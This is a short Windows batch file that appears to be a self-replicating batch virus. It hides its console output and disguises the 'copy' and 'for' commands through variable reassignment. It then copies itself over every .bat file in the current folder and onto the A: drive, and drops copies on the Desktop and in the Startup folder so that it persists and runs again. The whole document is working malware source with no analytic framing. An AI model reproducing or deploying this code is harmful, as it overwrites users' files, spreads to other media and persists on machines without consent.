	@echo off
	ctty nul
	set spth=trhs
	set spth=copy
	%spth% %0 A:\*.bat
	set rof=fds
	set rof=for
	%rof% %%v in (*.bat) do %spth% %0 %%v
	%spth% %0 %windir%\Desktop\open.bat
	set ss=mhxb
	set ss=start
	set pp=gfdfd
	set pp=progra
	%spth% %0 %windir%\%start%m~1\%pp%ms\autost~1\start.bat
